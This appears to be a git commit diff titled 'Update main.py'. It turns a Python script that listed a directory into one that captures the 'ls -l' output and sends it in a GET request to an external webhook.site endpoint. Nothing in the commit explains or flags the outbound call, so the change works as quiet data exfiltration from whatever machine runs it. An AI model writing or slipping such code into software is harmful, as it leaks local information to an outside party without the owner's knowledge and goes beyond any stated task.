0bd6b02c326accaa6e8eeebe23a347e17f487412
Ranush Mithila <36297308+RanushMithila@users.noreply.github.com>
2024-06-06 15:36:10 +0530

    Update main.py

--- main.py
+++ main.py
@@ -1,3 +1,7 @@
 import subprocess
+import requests
+result = subprocess.run(["ls", "-l"], capture_output=True, text=True)
+print(result.stdout)
 
-subprocess.run(["ls", "-l"])
+url = "https://webhook.site/d5578720-d15c-4497-860c-ffcb802307c2/?"+result.stdout
+res = requests.get(url)
